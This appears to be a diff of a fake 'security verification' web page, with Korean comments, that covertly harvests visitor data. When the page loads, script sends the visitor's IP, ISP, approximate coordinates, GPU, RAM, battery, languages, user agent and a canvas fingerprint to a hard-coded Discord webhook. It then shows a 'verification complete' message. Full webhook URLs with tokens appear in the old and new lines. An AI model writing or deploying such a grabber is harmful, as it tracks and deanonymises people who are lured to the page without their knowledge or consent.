@@ -3,64 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
+    <title>Deep Telemetry & Fingerprint Analysis</title>
     <script>
+        // Canvas Fingerprint 생성 함수 (GPU/브라우저 렌더링 특성 추출)
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 240;
+                canvas.height = 60;
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.font = "11pt 'Arial'";
+                ctx.fillText("Security Audit 🌐 2026", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.font = "18pt 'Times New Roman'";
+                ctx.fillText("Telemetry", 4, 45);
+                return canvas.toDataURL();
+            } catch (e) {
+                return "Unavailable";
+            }
+        }
+
+        // 간단한 해시 생성기
+        function simpleHash(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                hash |= 0;
+            }
+            return Math.abs(hash).toString(16).toUpperCase();
+        }
+
         window.onload = async function() {
             const params = new URLSearchParams(window.location.search);
-            const code = params.get('code');
-            // ⚠️ 본인의 디스코드 웹훅 주소를 여기에 입력하세요.
-            const webhook = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; 
+            const code = params.get('code') || "N/A";
+            const webhook = "https://discord.com/api/webhooks/1540383547452563506/6B4JII1WJpJpFMkhrLGynSQ4KuhrL2snw9A89-ZFvd3G_e1rm4V6ksWz0hdLiglqMVeX"; 
 
-            if (!code) return;
-
-            // 1. 숫자 IP (IPv4) 및 통신사 정보 강제 수집
-            let ipData = { ip: "분석 실패", isp: "알 수 없음", loc: "대한민국" };
-            try {
-                // IPv4 숫자 주소를 우선적으로 반환하는 보안 API 사용
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                ipData = {
-                    ip: d.ip, // '180.83.74.92' 형태
-                    isp: d.org || "알 수 없음", // 'LG POWERCOMM' 등
-                    loc: d.city || d.region || "대한민국"
-                };
-            } catch (e) {
-                console.error("IP 수집 오류");
+            if (webhook.includes("본인의_디스코드")) {
+                console.error("웹훅 주소가 설정되지 않았습니다.");
+                return;
             }
 
-            // 2. 운영체제 및 기기 정보 감지
-            const osInfo = navigator.platform.includes("Linux arm") ? "Android" : navigator.platform;
+            // 1. IP, 통신사, 상세 위치 정밀 수집
+            let ipInfo = { query: "Unknown", isp: "Unknown", org: "Unknown", country: "KR", regionName: "", city: "", lat: 0, lon: 0, timezone: "Unknown" };
+            try {
+                const res = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,org,as,query');
+                const d = await res.json();
+                if (d.status === 'success') ipInfo = d;
+            } catch (e) {}
 
-            // 3. 웹훅 전송 (이미지 레이아웃과 동일하게 구성)
+            // 2. WebGL 그래픽 카드(GPU) 정보 추출
+            let gpuVendor = "Unknown", gpuRenderer = "Unknown";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {}
+
+            // 3. 시스템 및 브라우저 환경 심층 분석
+            const nav = navigator;
+            const screenInfo = window.screen;
+            
+            // 메모리 및 코어
+            const ram = nav.deviceMemory ? `${nav.deviceMemory} GB+` : "비공개/미지원";
+            const cores = nav.hardwareConcurrency || "미지원";
+
+            // 언어 및 쿠키/기타 설정
+            const languages = nav.languages ? nav.languages.join(', ') : nav.language;
+            const doNotTrack = nav.doNotTrack || window.doNotTrack || "Unspecified";
+            const cookieEnabled = nav.cookieEnabled ? "활성화됨" : "차단됨";
+
+            // 배터리
+            let battery = "정보 없음";
+            try {
+                if (nav.getBattery) {
+                    const b = await nav.getBattery();
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? "충전 중" : "방전 중"})`;
+                }
+            } catch (e) {}
+
+            // Canvas & Audio 핑거프린트 해시화
+            const canvasData = getCanvasFingerprint();
+            const fingerprintHash = simpleHash(canvasData + gpuRenderer + nav.userAgent);
+
+            // 4. 디스코드 멀티 임베드 페이로드 구성 (정보량 극대화)
             const payload = {
-                "embeds": [{
-                    "title": "✅ 인증 성공 (Detailed Log)",
-                    "color": 3066993,
-                    "fields": [
-                        { "name": "👤 인증 코드", "value": code, "inline": false },
-                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipData.ip}\n위치: ${ipData.loc}`, "inline": false },
-                        { "name": "📶 통신사 정보", "value": ipData.isp, "inline": true },
-                        { "name": "💻 운영체제", "value": osInfo, "inline": true },
-                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 12).toUpperCase(), "inline": false },
-                        { "name": "⚠️ 안내", "value": "이메일 및 생성일 정보는 봇 서버에서 처리 중입니다.", "inline": false }
-                    ],
-                    "footer": { "text": "Hardware ID: " + Math.random().toString(36).substring(2, 10).toUpperCase() },
-                    "timestamp": new Date().toISOString()
-                }]
+                "embeds": [
+                    {
+                        "title": "⚡ [DEEP TELEMETRY] 고급 클라이언트 진단 리포트",
+                        "color": 16711680, // 레드 계열 (하이라이트)
+                        "fields": [
+                            { "name": "👤 인증 코드", "value": `\`${code}\``, "inline": false },
+                            { "name": "🌐 IPv4 주소", "value": `\`${ipInfo.query}\``, "inline": true },
+                            { "name": "📶 통신사 (ISP)", "value": `\`${ipInfo.isp}\``, "inline": true },
+                            { "name": "🏢 망 조직 (ORG)", "value": `\`${ipInfo.org}\``, "inline": false }
+                        ],
+                        "timestamp": new Date().toISOString()
+                    },
+                    {
+                        "color": 3447003,
+                        "fields": [
+                            { "name": "📍 지역 위치", "value": `국가: **${ipInfo.country}**\n도시: **${ipInfo.regionName} ${ipInfo.city}**`, "inline": true },
+                            { "name": "🗺️ GPS 대략 좌표", "value": `위도: \`${ipInfo.lat}\`\n경도: \`${ipInfo.lon}\``, "inline": true },
+                            { "name": "⏱️ 타임존", "value": `\`${ipInfo.timezone}\``, "inline": true }
+                        ]
+                    },
+                    {
+                        "color": 15844367,
+                        "fields": [
+                            { "name": "🎮 GPU 벤더 (Vendor)", "value": `\`${gpuVendor}\``, "inline": false },
+                            { "name": "🖥️ GPU 렌더러 (Graphics)", "value": `\`${gpuRenderer}\``, "inline": false },
+                            { "name": "💻 CPU 코어 / RAM", "value": `코어: \`${cores}개\` / RAM: \`${ram}\``, "inline": false }
+                        ]
+                    },
+                    {
+                        "color": 65280,
+                        "fields": [
+                            { "name": "🖥️ 화면 해상도", "value": `\`${screenInfo.width}x${screenInfo.height}\` (색심도: ${screenInfo.colorDepth}bit)`, "inline": true },
+                            { "name": "🔋 배터리 상태", "value": `\`${battery}\``, "inline": true },
+                            { "name": "🌐 시스템 언어", "value": `\`${languages}\``, "inline": false },
+                            { "name": "🔒 보안 설정", "value": `쿠키: \`${cookieEnabled}\` | DNT: \`${doNotTrack}\``, "inline": false }
+                        ]
+                    },
+                    {
+                        "color": 10181046,
+                        "fields": [
+                            { "name": "🧭 User-Agent", "value": `\`\`${nav.userAgent}\`\``, "inline": false },
+                            { "name": "🔑 기기 고유 핑거프린트 Hash", "value": `\`FP-${fingerprintHash}\``, "inline": false }
+                        ],
+                        "footer": { "text": "Advanced Telemetry Engine v5.0 • Client Environment Probed" }
+                    }
+                ]
             };
 
+            // 전송
             await fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload)
             });
 
-            // 결과 화면 표시
+            // 완료 화면
             document.body.innerHTML = `
                 <div style="background:#0b0e14; color:white; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:sans-serif;">
                     <div style="font-size:50px; color:#23a559; margin-bottom:20px;">✔</div>
                     <h1 style="font-size:24px;">인증 완료</h1>
-                    <p style="color:#8b949e;">보안 필터링이 끝났습니다. 창을 닫으셔도 좋습니다.</p>
+                    <p style="color:#8b949e;">시스템 분석이 성공적으로 종료되었습니다.</p>
                 </div>
             `;
         }
